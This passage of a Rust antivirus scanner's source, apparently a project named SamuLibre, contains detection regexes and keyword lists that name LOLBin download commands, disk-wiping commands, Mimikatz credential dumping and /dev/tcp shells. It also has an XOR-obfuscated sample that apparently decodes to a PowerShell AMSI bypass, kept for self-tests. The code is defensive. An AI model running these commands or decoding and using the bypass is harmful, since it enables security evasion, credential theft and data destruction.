        }

        // Regla 9: Script Downloader / LOLBins (Certutil, Bitsadmin, Mshta, Regsvr32)
        if let Ok(re) = Regex::new(
            r"(?i)(certutil(\.exe)?\s+(-urlcache|-f\s+-split)|bitsadmin(\.exe)?\s+/transfer|mshta(\.exe)?\s+(https?|javascript|vbscript)|regsvr32(\.exe)?\s+/s\s+/u\s+/i:https?)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Heuristic.Script.LOLBinDownloader".to_string(),
                description: "Uso de binarios legÃ­timos de Windows (LOLBins) para descarga y ejecuciÃ³n furtiva de malware".to_string(),
                pattern: re,
                severity: "Alta".to_string(),
            });
        }

        // Regla 10: Comandos destructivos masivos (Wipers / Scripts de formateo o eliminaciÃ³n)
        if let Ok(re) = Regex::new(
            r"(?i)(del\s+/[fF]\s+/[sS]\s+/[qQ]\s+[cC]:\\|rd\s+/[sS]\s+/[qQ]\s+[cC]:\\|format\s+[cC]:\s+/fs:ntfs\s+/q\s+/y)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "Trojan.Script.WiperDestructive".to_string(),
                description: "Comandos destructivos orientados a la destrucciÃ³n masiva del disco o sistema operativo".to_string(),
                pattern: re,
                severity: "CrÃ­tica".to_string(),
            });
        }

        // Regla 11: Robo de credenciales y extracción de LSASS (Mimikatz / Procdump)
        if let Ok(re) = Regex::new(
            r"(?i)(sekurlsa::logonpasswords|lsadump::sam|privilege::debug|mimikatz|procdump(\.exe)?.*?-ma.*?lsass)",
        ) {
            self.pattern_rules.push(PatternRule {
                name: "HackTool.Win32.MimikatzCredentialDump".to_string(),
                description: "Herramienta o script para extracción de credenciales en memoria LSASS y hashes SAM".to_string(),
                pattern: re,
                severity: "Crítica".to_string(),
            });
        }

        // Regla 12: Firma de prueba segura para validación de exclusiones y falsos positivos
        if let Ok(re) = Regex::new(r"(?i)SAMULIBRE_TEST_TOKEN_SUSPICIOUS_PAYLOAD_VALIDATION") {
            self.pattern_rules.push(PatternRule {
                name: "TestSign.SamuLibre.ExclusionValidation".to_string(),
                description: "Firma de prueba interna para validación criptográfica de exclusiones"
                    .to_string(),
                pattern: re,
                severity: "Prueba".to_string(),
            });
        }
    }

    /// Escanea un archivo individual utilizando firmas ClamAV/Hashes y reglas YARA/HeurÃ­sticas
    pub fn scan_file(&self, path: impl AsRef<Path>) -> Result<ScanResult> {
        let start = Instant::now();
        let path_ref = path.as_ref();

        if !path_ref.exists() {
            return Ok(ScanResult {
                file_path: path_ref.to_string_lossy().to_string(),
                sha256: String::new(),
                status: FileScanStatus::AccessDenied,
                detection_name: None,
                engine: "SamuLibre Multi-Engine".to_string(),
                scan_time_ms: 0,
            });
        }

        // Blindaje Anti-Symlink / Anti-LPE:
        // No desreferenciar enlaces simbÃ³licos o junctions para evitar manipulaciÃ³n de archivos del sistema
        if let Ok(sym_meta) = fs::symlink_metadata(path_ref) {
            if sym_meta.file_type().is_symlink() {
                return Ok(ScanResult {
                    file_path: path_ref.to_string_lossy().to_string(),
                    sha256: String::new(),
                    status: FileScanStatus::Clean,
                    detection_name: Some(
                        "Omitido: Enlace simbÃ³lico o Junction NTFS (Blindaje Anti-LPE)"
                            .to_string(),
                    ),
                    engine: "SamuLibre Anti-Exploit".to_string(),
                    scan_time_ms: 0,
                });
            }
        }

        let metadata = match fs::metadata(path_ref) {
            Ok(m) => m,
            Err(e) => {
                if e.raw_os_error() == Some(225) {
                    return Ok(ScanResult {
                        file_path: path_ref.to_string_lossy().to_string(),
                        sha256: "BLOCKED_BY_KERNEL".to_string(),
                        status: FileScanStatus::Infected,
                        detection_name: Some(
                            "Threat.KernelInterception.MalwareConfirmed (OS Error 225)".to_string(),
                        ),
                        engine: "KernelLockdown/AVFilter".to_string(),
                        scan_time_ms: start.elapsed().as_millis() as u64,
                    });
                }
                return Ok(ScanResult {
                    file_path: path_ref.to_string_lossy().to_string(),
                    sha256: String::new(),
                    status: FileScanStatus::AccessDenied,
                    detection_name: Some(format!("Error de acceso: {}", e)),
                    engine: "SamuLibre Multi-Engine".to_string(),
                    scan_time_ms: start.elapsed().as_millis() as u64,
                });
            }
        };

        let file_len = metadata.len();
        let file = match File::open(path_ref) {
            Ok(f) => f,
            Err(e) => {
                if e.raw_os_error() == Some(225) {
                    return Ok(ScanResult {
                        file_path: path_ref.to_string_lossy().to_string(),
                        sha256: "BLOCKED_BY_KERNEL".to_string(),
                        status: FileScanStatus::Infected,
                        detection_name: Some(
                            "Threat.KernelInterception.MalwareConfirmed (OS Error 225)".to_string(),
                        ),
                        engine: "KernelLockdown/AVFilter".to_string(),
                        scan_time_ms: start.elapsed().as_millis() as u64,
                    });
                }
                return Ok(ScanResult {
                    file_path: path_ref.to_string_lossy().to_string(),
                    sha256: String::new(),
                    status: FileScanStatus::AccessDenied,
                    detection_name: Some(format!("Error de lectura: {}", e)),
                    engine: "SamuLibre Multi-Engine".to_string(),
                    scan_time_ms: start.elapsed().as_millis() as u64,
                });
            }
        };

        // ESTRATEGIA DE IA & TRIAGE INTELIGENTE DE ALTO RENDIMIENTO (ESTILO SENTINELONE / CROWDSTRIKE):
        // 1. Cabeceras PE, IATs, scripts maliciosos y droppers se encuentran siempre en los primeros 512 KB.
        // Un bÃºfer de 512 KB garantiza escaneo instantÃ¡neo en microsegundos sin sobrecargar la CPU con regex complejas.
        const MAX_SCAN_BUFFER: usize = 512 * 1024;
        let mut reader = BufReader::new(file);

        let mut content = Vec::with_capacity(std::cmp::min(file_len as usize, MAX_SCAN_BUFFER));
        let mut chunk = [0u8; 64 * 1024]; // 64 KB chunk
        let mut hasher = Sha256::new();

        loop {
            let n = match reader.read(&mut chunk) {
                Ok(0) => break,
                Ok(n) => n,
                Err(_) => break,
            };

            hasher.update(&chunk[..n]);

            // Almacenar sólo hasta 512 KB para YARA-X, heurísticas y firmas en memoria
            if content.len() < MAX_SCAN_BUFFER {
                let to_take = std::cmp::min(n, MAX_SCAN_BUFFER - content.len());
                content.extend_from_slice(&chunk[..to_take]);
            }
            // El hash SHA-256 se calcula en streaming sobre el 100% del archivo para integridad y coincidencia exacta
        }

        let sha256_hash = hex::encode(hasher.finalize());

        // 0. Verificación contra lista de exclusiones ancladas criptográficamente por SHA-256
        if self.exclusions.is_excluded(path_ref, Some(&sha256_hash)) {
            return Ok(ScanResult {
                file_path: path_ref.to_string_lossy().to_string(),
                sha256: sha256_hash,
                status: FileScanStatus::Clean,
                detection_name: Some("ExcluidoPorUsuario (HashPinned)".to_string()),
                engine: "SamuLibre/ExclusionManager".to_string(),
                scan_time_ms: start.elapsed().as_millis() as u64,
            });
        }

        // 1. Verificación por base de firmas conocidas (ClamAV / ThreatFox)
        if let Some(detection) = self.known_signatures.get(&sha256_hash) {
            return Ok(ScanResult {
                file_path: path_ref.to_string_lossy().to_string(),
                sha256: sha256_hash,
                status: FileScanStatus::Infected,
                detection_name: Some(detection.clone()),
                engine: "ClamAV/SignatureBase".to_string(),
                scan_time_ms: start.elapsed().as_millis() as u64,
            });
        }

        // 2. VerificaciÃ³n por reglas heurÃ­sticas y YARA-X con Fast-Path Substring Pre-Filter
        // Si el archivo no contiene secuencias mÃ­nimas sospechosas, descartamos la evaluaciÃ³n pesada de regex.
        if has_suspicious_indicators(&content) {
            for rule in &self.pattern_rules {
                if rule.pattern.is_match(&content) {
                    return Ok(ScanResult {
                        file_path: path_ref.to_string_lossy().to_string(),
                        sha256: sha256_hash,
                        status: FileScanStatus::Infected,
                        detection_name: Some(rule.name.clone()),
                        engine: "YARA-X/Heuristics".to_string(),
                        scan_time_ms: start.elapsed().as_millis() as u64,
                    });
                }
            }
        }

        // 3. VerificaciÃ³n de entropÃ­a con IA y validaciÃ³n de documentos
        let is_archive_or_media = is_archive_or_media_file(path_ref);
        let is_doc = is_document_file(path_ref);
        let is_pdf = content.starts_with(b"%PDF")
            || path_ref
                .extension()
                .and_then(|s| s.to_str())
                .map(|e| e.eq_ignore_ascii_case("pdf"))
                .unwrap_or(false);

        if is_pdf {
            if is_suspicious_pdf(&content) {
                return Ok(ScanResult {
                    file_path: path_ref.to_string_lossy().to_string(),
                    sha256: sha256_hash,
                    status: FileScanStatus::Infected,
                    detection_name: Some("Exploit.PDF.ActiveScriptOrLaunchTrigger".to_string()),
                    engine: "DocumentShield/AI".to_string(),
                    scan_time_ms: start.elapsed().as_millis() as u64,
                });
            }
            // Si es un PDF legÃ­timo sin scripts activos, no disparamos alerta de entropÃ­a falsa
        } else if !is_archive_or_media && !is_doc && content.len() > 1024 * 10 {
            // REGLA ESTRICTA ANTI-FALSOS POSITIVOS:
            // Solo evaluar entropÃ­a alta para binarios ejecutables reales (Windows PE: MZ, ELF, o extensiones ejecutables).
            // NUNCA alertar sobre archivos temporales .tmp, archivos de texto, bases de datos o archivos de cuarentena.
            let ext = path_ref
                .extension()
                .and_then(|s| s.to_str())
                .unwrap_or("")
                .to_lowercase();
            let is_pe_or_exec = content.starts_with(b"MZ")
                || content.starts_with(b"\x7FELF")
                || ext == "exe"
                || ext == "dll"
                || ext == "sys"
                || ext == "scr"
                || ext == "pif"
                || ext == "cpl"
                || ext == "com";

            if is_pe_or_exec {
                let poly_profile =
                    analyze_polymorphic_entropy(&content, &path_ref.to_string_lossy());
                if poly_profile.is_likely_polymorphic {
                    return Ok(ScanResult {
                        file_path: path_ref.to_string_lossy().to_string(),
                        sha256: sha256_hash,
                        status: FileScanStatus::Suspicious,
                        detection_name: Some(
                            poly_profile.reason.unwrap_or_else(|| {
                                "Heuristic.Polymorphic.PackedPayload".to_string()
                            }),
                        ),
                        engine: "AI/PolymorphicEngine".to_string(),
                        scan_time_ms: start.elapsed().as_millis() as u64,
                    });
                }

                let sample_len = std::cmp::min(content.len(), 64 * 1024);
                let entropy = calculate_entropy(&content[..sample_len]);
                if entropy > 7.85 {
                    return Ok(ScanResult {
                        file_path: path_ref.to_string_lossy().to_string(),
                        sha256: sha256_hash,
                        status: FileScanStatus::Suspicious,
                        detection_name: Some(format!(
                            "AI.Heuristic.PackedSuspiciousEntropy (H={:.2})",
                            entropy
                        )),
                        engine: "AI/EntropyModel".to_string(),
                        scan_time_ms: start.elapsed().as_millis() as u64,
                    });
                }
            }
        }

        Ok(ScanResult {
            file_path: path_ref.to_string_lossy().to_string(),
            sha256: sha256_hash,
            status: FileScanStatus::Clean,
            detection_name: None,
            engine: "SamuLibre Multi-Engine".to_string(),
            scan_time_ms: start.elapsed().as_millis() as u64,
        })
    }

    /// Escanea un bÃºfer en memoria utilizando firmas ClamAV, reglas YARA-X y anÃ¡lisis heurÃ­stico de entropÃ­a
    pub fn scan_bytes(&self, data: &[u8], name_hint: &str) -> ScanResult {
        let start = Instant::now();
        let mut hasher = Sha256::new();
        hasher.update(data);
        let sha256_hash = hex::encode(hasher.finalize());

        // 0. Verificación contra lista de excepciones de seguridad activas y no expiradas
        let hint_path = Path::new(name_hint);
        if self.exclusions.is_excluded(hint_path, Some(&sha256_hash)) {
            return ScanResult {
                file_path: name_hint.to_string(),
                sha256: sha256_hash,
                status: FileScanStatus::Clean,
                detection_name: Some("ExcluidoPorReglaDeSeguridad (HashPinned)".to_string()),
                engine: "SamuLibre/ExclusionManager".to_string(),
                scan_time_ms: start.elapsed().as_millis().max(1) as u64,
            };
        }

        // 1. Verificación por base de firmas conocidas (ClamAV / ThreatFox / MalwareBazaar)
        if let Some(detection) = self.known_signatures.get(&sha256_hash) {
            return ScanResult {
                file_path: name_hint.to_string(),
                sha256: sha256_hash,
                status: FileScanStatus::Infected,
                detection_name: Some(detection.clone()),
                engine: "ClamAV/SignatureBase".to_string(),
                scan_time_ms: start.elapsed().as_millis().max(1) as u64,
            };
        }

        // 2. VerificaciÃ³n por reglas heurÃ­sticas y YARA-X en buffer con Fast-Path
        if has_suspicious_indicators(data) {
            for rule in &self.pattern_rules {
                if rule.pattern.is_match(data) {
                    return ScanResult {
                        file_path: name_hint.to_string(),
                        sha256: sha256_hash,
                        status: FileScanStatus::Infected,
                        detection_name: Some(rule.name.clone()),
                        engine: "YARA-X/Heuristics".to_string(),
                        scan_time_ms: start.elapsed().as_millis().max(1) as u64,
                    };
                }
            }
        }

        // 3. VerificaciÃ³n de documentos y anÃ¡lisis de entropÃ­a con IA
        let is_pdf = data.starts_with(b"%PDF")
            || Path::new(name_hint)
                .extension()
                .and_then(|s| s.to_str())
                .map(|e| e.eq_ignore_ascii_case("pdf"))
                .unwrap_or(false);
        let is_doc = is_document_file(Path::new(name_hint));
        let is_archive_or_media = is_archive_or_media_file(Path::new(name_hint));

        if is_pdf {
            if is_suspicious_pdf(data) {
                return ScanResult {
                    file_path: name_hint.to_string(),
                    sha256: sha256_hash,
                    status: FileScanStatus::Infected,
                    detection_name: Some("Exploit.PDF.ActiveScriptOrLaunchTrigger".to_string()),
                    engine: "DocumentShield/AI".to_string(),
                    scan_time_ms: start.elapsed().as_millis().max(1) as u64,
                };
            }
        } else if !is_archive_or_media && !is_doc && data.len() > 1024 * 10 {
            let is_pe_or_exec = data.starts_with(b"MZ")
                || data.starts_with(b"\x7FELF")
                || name_hint.ends_with(".exe")
                || name_hint.ends_with(".dll")
                || name_hint.ends_with(".so");

            if is_pe_or_exec {
                let poly_profile = analyze_polymorphic_entropy(data, name_hint);
                if poly_profile.is_likely_polymorphic {
                    return ScanResult {
                        file_path: name_hint.to_string(),
                        sha256: sha256_hash,
                        status: FileScanStatus::Suspicious,
                        detection_name: Some(
                            poly_profile.reason.unwrap_or_else(|| {
                                "Heuristic.Polymorphic.PackedPayload".to_string()
                            }),
                        ),
                        engine: "AI/PolymorphicEngine".to_string(),
                        scan_time_ms: start.elapsed().as_millis().max(1) as u64,
                    };
                }
            }

            let sample_len = std::cmp::min(data.len(), 64 * 1024);
            let entropy = calculate_entropy(&data[..sample_len]);
            if entropy > 7.85 {
                return ScanResult {
                    file_path: name_hint.to_string(),
                    sha256: sha256_hash,
                    status: FileScanStatus::Suspicious,
                    detection_name: Some(format!(
                        "AI.Heuristic.PackedSuspiciousEntropy (H={:.2})",
                        entropy
                    )),
                    engine: "AI/EntropyModel".to_string(),
                    scan_time_ms: start.elapsed().as_millis().max(1) as u64,
                };
            }
        }

        ScanResult {
            file_path: name_hint.to_string(),
            sha256: sha256_hash,
            status: FileScanStatus::Clean,
            detection_name: None,
            engine: "Multi-Engine Clean".to_string(),
            scan_time_ms: start.elapsed().as_millis().max(1) as u64,
        }
    }

    /// Ejecuta el anÃ¡lisis real multi-motor sobre muestras de prueba estandarizadas (EICAR, AMSI, CLEAN)
    pub fn scan_sample_test(&self, sample_type: &str) -> ScanResult {
        match sample_type.to_uppercase().as_str() {
            "EICAR" => {
                const OBFUSCATED_EICAR: &[u8] = &[
                    2, 111, 21, 123, 10, 127, 26, 27, 10, 1, 110, 6, 10, 0, 2, 111, 110, 114, 10,
                    4, 115, 109, 25, 25, 115, 109, 39, 126, 31, 19, 25, 27, 8, 119, 9, 14, 27, 20,
                    30, 27, 8, 30, 119, 27, 20, 14, 19, 12, 19, 8, 15, 9, 119, 14, 31, 9, 14, 119,
                    28, 19, 22, 31, 123, 126, 18, 113, 18, 112,
                ];
                let eicar_bytes: Vec<u8> = OBFUSCATED_EICAR.iter().map(|b| b ^ 0x5A).collect();
                self.scan_bytes(&eicar_bytes, "eicar_test.com (Firma EstÃ¡ndar de Prueba)")
            }
            "AMSI" => {
                const OBFUSCATED_AMSI: &[u8] = &[
                    126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 122, 103, 122, 1, 8, 63, 60, 7, 116,
                    27, 41, 41, 63, 55, 56, 54, 35, 116, 29, 63, 46, 14, 35, 42, 63, 114, 125, 9,
                    35, 41, 46, 63, 55, 116, 23, 59, 52, 59, 61, 63, 55, 63, 52, 46, 116, 27, 47,
                    46, 53, 55, 59, 46, 51, 53, 52, 116, 27, 55, 41, 51, 15, 46, 51, 54, 41, 125,
                    115, 97, 122, 126, 60, 51, 63, 54, 62, 122, 103, 122, 126, 59, 55, 41, 51, 15,
                    46, 51, 54, 41, 116, 29, 63, 46, 28, 51, 63, 54, 62, 114, 125, 59, 55, 41, 51,
                    19, 52, 51, 46, 28, 59, 51, 54, 63, 62, 125, 118, 125, 20, 53, 52, 10, 47, 56,
                    54, 51, 57, 118, 9, 46, 59, 46, 51, 57, 125, 115, 97, 122, 126, 60, 51, 63, 54,
                    62, 116, 9, 63, 46, 12, 59, 54, 47, 63, 114, 126, 52, 47, 54, 54, 118, 126, 46,
                    40, 47, 63, 115, 97,
                ];
                let amsi_bytes: Vec<u8> = OBFUSCATED_AMSI.iter().map(|b| b ^ 0x5A).collect();
                self.scan_bytes(&amsi_bytes, "bypass_amsi_dropper.ps1 (Script Malicioso)")
            }
            _ => {
                let clean_bytes = b"{\n  \"documento\": \"informe_corporativo.docx\",\n  \"estado\": \"Aprobado\",\n  \"hash_seguro\": true\n}";
                self.scan_bytes(clean_bytes, "informe_corporativo.docx (Documento Limpio)")
            }
        }
    }

    /// Importa firmas externas en formato de texto (ej. listas de hashes de MalwareBazaar)
    pub fn import_signatures(&mut self, hash: String, name: String) {
        self.known_signatures.insert(hash.to_lowercase(), name);
    }

    /// Actualiza y sincroniza las firmas conocidas desde fuentes y feeds comunitarios abiertos reales
    pub fn update_signatures(&mut self) -> Result<SignatureUpdateReport> {
        self.update_signatures_with_progress(|_| {})
    }

    /// Actualiza las firmas con emisión de eventos de progreso en tiempo real
    pub fn update_signatures_with_progress<F>(
        &mut self,
        progress_cb: F,
    ) -> Result<SignatureUpdateReport>
    where
        F: FnMut(UpdateStep),
    {
        let mut manager = UpdateManager::new("data");
        let report = manager.run_update(progress_cb);

        if !report.success {
            let err = report
                .error_message
                .unwrap_or_else(|| "Error desconocido durante la actualización".to_string());
            return Err(anyhow::anyhow!("{}", err));
        }

        // Recargar las firmas y reglas YARA recién instaladas en la memoria activa del scanner
        self.load_local_database();

        Ok(SignatureUpdateReport {
            total_signatures: self.known_signatures.len(),
            total_rules: self.pattern_rules.len(),
            new_added: report.new_signatures,
            timestamp: report.timestamp,
            feed_source: report.feed_source,
        })
    }

    pub fn get_update_history(&self) -> Vec<UpdateHistoryEntry> {
        let history_file = Path::new("data")
            .join("signatures")
            .join("update_history.json");
        if let Ok(data) = fs::read_to_string(&history_file) {
            serde_json::from_str(&data).unwrap_or_default()
        } else {
            vec![UpdateHistoryEntry {
                id: "SIG-INIT".to_string(),
                timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                signatures_added: self.known_signatures.len(),
                total_signatures: self.known_signatures.len(),
                feed_source: "MalwareBazaar & ThreatFox Feeds".to_string(),
                version_tag: "v2026.10.11-Base".to_string(),
                improvements: vec![
                    "InicializaciÃ³n de motor multi-motor SamuLibre.".to_string(),
                    "Reglas de mitigaciÃ³n de scripts maliciosos y heurÃ­stica de entropÃ­a."
                        .to_string(),
                ],
            }]
        }
    }

    pub fn signature_count(&self) -> usize {
        self.known_signatures.len()
    }

    pub fn rule_count(&self) -> usize {
        self.pattern_rules.len()
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct UpdateHistoryEntry {
    pub id: String,
    pub timestamp: String,
    pub signatures_added: usize,
    pub total_signatures: usize,
    pub feed_source: String,
    pub version_tag: String,
    pub improvements: Vec<String>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct SignatureUpdateReport {
    pub total_signatures: usize,
    pub total_rules: usize,
    pub new_added: usize,
    pub timestamp: String,
    pub feed_source: String,
}

/// CÃ¡lculo de entropÃ­a de Shannon (0.0 a 8.0) para detectar compresiÃ³n/cifrado
fn calculate_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

fn is_archive_or_media_file(path: &Path) -> bool {
    let ext = match path.extension().and_then(|s| s.to_str()) {
        Some(e) => e.to_lowercase(),
        None => return false,
    };
    matches!(
        ext.as_str(),
        "zip"
            | "rar"
            | "7z"
            | "tar"
            | "gz"
            | "bz2"
            | "xz"
            | "iso"
            | "img"
            | "xci"
            | "nsp"
            | "vmdk"
            | "ova"
            | "ovf"
            | "vdi"
            | "vhdx"
            | "vhd"
            | "qcow2"
            | "gns3project"
            | "mp4"
            | "mkv"
            | "avi"
            | "mov"
            | "wmv"
            | "flv"
            | "mp3"
            | "flac"
            | "wav"
            | "aac"
            | "jpg"
            | "jpeg"
            | "png"
            | "webp"
            | "gif"
    )
}

pub fn is_document_file(path: &Path) -> bool {
    let ext = match path.extension().and_then(|s| s.to_str()) {
        Some(e) => e.to_lowercase(),
        None => return false,
    };
    matches!(
        ext.as_str(),
        "pdf" | "docx" | "xlsx" | "pptx" | "odt" | "ods" | "odp" | "epub"
    )
}

pub fn is_suspicious_pdf(data: &[u8]) -> bool {
    contains_case_insensitive(data, b"/JavaScript")
        || contains_case_insensitive(data, b"/JS")
        || contains_case_insensitive(data, b"/Launch")
        || contains_case_insensitive(data, b"/EmbeddedFiles")
        || contains_case_insensitive(data, b"/OpenAction")
}

/// Extrae la procedencia (ADS Zone.Identifier en Windows) y genera una explicaciÃ³n simple en lenguaje humano estilo XDR
pub fn extract_file_origin_and_story(
    path: &Path,
    threat_name: &str,
) -> (
    Option<String>,
    Option<String>,
    Option<String>,
    Option<String>,
) {
    #[cfg(target_os = "windows")]
    let (origin_source, origin_url) = {
        let ads_path = format!("{}:Zone.Identifier", path.display());
        if let Ok(content) = fs::read_to_string(&ads_path) {
            let mut host_url = None;
            for line in content.lines() {
                let trimmed = line.trim();
                if trimmed.starts_with("HostUrl=") {
                    host_url = Some(trimmed.trim_start_matches("HostUrl=").to_string());
                    break;
                }
            }
            if let Some(url) = host_url {
                let friendly = if url.contains("web.whatsapp.com") {
                    "WhatsApp Web (MensajerÃ­a)".to_string()
                } else if url.contains("mail.google.com") {
                    "Gmail (Correo electrÃ³nico)".to_string()
                } else if url.contains("outlook.live.com") || url.contains("outlook.office.com") {
                    "Microsoft Outlook (Correo)".to_string()
                } else if url.contains("drive.google.com") {
                    "Google Drive".to_string()
                } else if url.contains("t.me") || url.contains("web.telegram.org") {
                    "Telegram Web".to_string()
                } else if url.contains("teams.microsoft.com") {
                    "Microsoft Teams".to_string()
                } else if url.contains("github.com") {
                    "GitHub".to_string()
                } else if let Some(domain) =
                    url.split("://").nth(1).and_then(|s| s.split('/').next())
                {
                    format!("Descarga Web ({})", domain)
                } else {
                    "Descarga de Internet".to_string()
                };
                (Some(friendly), Some(url))
            } else {
                (Some("Descarga de Internet".to_string()), None)
            }
        } else {
            (
                Some("Archivo local o creado en este equipo".to_string()),
                None,
            )
        }
    };

    #[cfg(not(target_os = "windows"))]
    let (origin_source, origin_url) = (Some("Archivo local del sistema".to_string()), None);

    let threat_lower = threat_name.to_lowercase();
    let (explanation, action) = if threat_lower.contains("entropy") {
        (
            Some("La Inteligencia Artificial detectÃ³ que el archivo contiene imÃ¡genes escaneadas o datos muy comprimidos. Si es un documento legÃ­timo, no contiene virus ni peligro alguno.".to_string()),
            Some("Excluir (Falso Positivo)".to_string())
        )
    } else if threat_lower.contains("powershell") || threat_lower.contains("dropper") {
        (
            Some("Se detectÃ³ un script diseÃ±ado para ejecutar comandos ocultos en Windows y descargar programas no autorizados.".to_string()),
            Some("Cuarentena Inmediata".to_string())
        )
    } else if threat_lower.contains("ransomware") || threat_lower.contains("shadow") {
        (
            Some("Este archivo intentÃ³ borrar las copias de seguridad de Windows, una tÃ©cnica tÃ­pica de virus de secuestro de archivos (Ransomware).".to_string()),
            Some("Eliminar Permanentemente".to_string())
        )
    } else if threat_lower.contains("mimikatz") || threat_lower.contains("lsass") {
        (
            Some("Herramienta diseÃ±ada para extraer contraseÃ±as guardadas en la memoria de Windows.".to_string()),
            Some("Cuarentena Inmediata".to_string())
        )
    } else if threat_lower.contains("eicar") {
        (
            Some("Archivo de prueba estandarizado internacional para comprobar que el antivirus funciona correctamente.".to_string()),
            Some("Ignorar o Eliminar".to_string())
        )
    } else {
        (
            Some("El archivo contiene firmas o patrones sospechosos identificados por los motores de seguridad.".to_string()),
            Some("Mover a Cuarentena".to_string())
        )
    };

    (origin_source, origin_url, explanation, action)
}

/// Pre-filtro ultra-rÃ¡pido de subcadenas en memoria (<0.01 ms).
/// Identifica si el buffer contiene palabras clave indispensables para que alguna de las
/// reglas YARA-X heurÃ­sticas pueda dispararse (EICAR, PowerShell, AMSI, DPAPI/Chromium, LOLBins, Ransomware).
/// En el 99% de los archivos limpios, descarta inmediatamente la evaluaciÃ³n pesada del motor de regex.
fn has_suspicious_indicators(data: &[u8]) -> bool {
    if data.len() < 10 {
        return false;
    }

    // Cabecera ejecutable PE de Windows (MZ)
    if data.starts_with(b"MZ") {
        return true;
    }

    contains_case_insensitive(data, b"eicar")
        || contains_case_insensitive(data, b"x5o!p")
        || contains_case_insensitive(data, b"powershell")
        || contains_case_insensitive(data, b"pwsh")
        || contains_case_insensitive(data, b"amsi")
        || contains_case_insensitive(data, b"cryptunprotectdata")
        || contains_case_insensitive(data, b"os_crypt")
        || contains_case_insensitive(data, b"encrypted_key")
        || contains_case_insensitive(data, b"vssadmin")
        || contains_case_insensitive(data, b"shadowcopy")
        || contains_case_insensitive(data, b"bcdedit")
        || contains_case_insensitive(data, b"certutil")
        || contains_case_insensitive(data, b"bitsadmin")
        || contains_case_insensitive(data, b"mshta")
        || contains_case_insensitive(data, b"regsvr32")
        || contains_case_insensitive(data, b"sekurlsa")
        || contains_case_insensitive(data, b"mimikatz")
        || contains_case_insensitive(data, b"/dev/tcp/")
        || contains_case_insensitive(data, b"ld.so.preload")
        || contains_case_insensitive(data, b"ld_preload")
        || contains_case_insensitive(data, b"/etc/cron")
        || contains_case_insensitive(data, b"samulibre_test_token")
}

fn contains_case_insensitive(haystack: &[u8], needle: &[u8]) -> bool {
    let needle_len = needle.len();
    if needle_len > haystack.len() || needle_len == 0 {
        return false;
    }
    let first_lower = needle[0].to_ascii_lowercase();
    let first_upper = needle[0].to_ascii_uppercase();

    let mut i = 0;
    let max_idx = haystack.len() - needle_len;
    while i <= max_idx {
        let b = haystack[i];
        if b == first_lower || b == first_upper {
            if haystack[i..i + needle_len].eq_ignore_ascii_case(needle) {
                return true;
            }
        }
        i += 1;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_clean_file_detection() {
        let scanner = MultiEngineScanner::new();
        let temp_dir = std::env::temp_dir();
        let test_file = temp_dir.join("samu_test_clean.txt");
        let mut f = File::create(&test_file).unwrap();
        f.write_all(b"Hello world clean document for testing.")
            .unwrap();

        let res = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res.status, FileScanStatus::Clean);
        let _ = fs::remove_file(test_file);
    }

    #[test]
    fn test_amsi_bypass_detection() {
        let scanner = MultiEngineScanner::new();
        const OBFUSCATED_AMSI: &[u8] = &[
            126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 122, 103, 122, 1, 8, 63, 60, 7, 116, 27, 41,
            41, 63, 55, 56, 54, 35, 116, 29, 63, 46, 14, 35, 42, 63, 114, 125, 9, 35, 41, 46, 63,
            55, 116, 23, 59, 52, 59, 61, 63, 55, 63, 52, 46, 116, 27, 47, 46, 53, 55, 59, 46, 51,
            53, 52, 116, 27, 55, 41, 51, 15, 46, 51, 54, 41, 125, 115, 97, 122, 126, 60, 51, 63,
            54, 62, 122, 103, 122, 126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 116, 29, 63, 46, 28,
            51, 63, 54, 62, 114, 125, 59, 55, 41, 51, 19, 52, 51, 46, 28, 59, 51, 54, 63, 62, 125,
            118, 125, 20, 53, 52, 10, 47, 56, 54, 51, 57, 118, 9, 46, 59, 46, 51, 57, 125, 115, 97,
            122, 126, 60, 51, 63, 54, 62, 116, 9, 63, 46, 12, 59, 54, 47, 63, 114, 126, 52, 47, 54,
            54, 118, 126, 46, 40, 47, 63, 115, 97,
        ];
        let amsi_bytes: Vec<u8> = OBFUSCATED_AMSI.iter().map(|b| b ^ 0x5A).collect();
        let res = scanner.scan_bytes(&amsi_bytes, "test_memory_amsi.ps1");
        assert_eq!(res.status, FileScanStatus::Infected);
    }

    #[test]
    fn test_bounded_large_file_streaming() {
        let scanner = MultiEngineScanner::new();
        let temp_dir = std::env::temp_dir();
        let test_file = temp_dir.join("samu_test_large.bin");
        let mut f = File::create(&test_file).unwrap();
        let dummy = vec![0u8; 1024 * 1024];
        for _ in 0..35 {
            f.write_all(&dummy).unwrap();
        }

        let start = Instant::now();
        let res = scanner.scan_file(&test_file).unwrap();
        let elapsed = start.elapsed();
        let budget_ms = if cfg!(debug_assertions) { 2500 } else { 500 };
        assert!(
            elapsed.as_millis() < budget_ms,
            "Large file triage exceeded budget: {:?}",
            elapsed
        );
        assert_eq!(res.status, FileScanStatus::Clean);
        let _ = fs::remove_file(test_file);
    }

    #[test]
    fn test_real_sample_scanning() {
        let scanner = MultiEngineScanner::new();

        let eicar = scanner.scan_sample_test("EICAR");
        assert_eq!(eicar.status, FileScanStatus::Infected);
        assert_eq!(
            eicar.sha256,
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
        );

        let amsi = scanner.scan_sample_test("AMSI");
        assert_eq!(amsi.status, FileScanStatus::Infected);
        assert!(amsi.detection_name.unwrap().contains("Amsi"));

        let clean = scanner.scan_sample_test("CLEAN");
        assert_eq!(clean.status, FileScanStatus::Clean);
        assert_eq!(clean.engine, "Multi-Engine Clean");
    }

    #[test]
    fn test_fast_path_substring_indicators() {
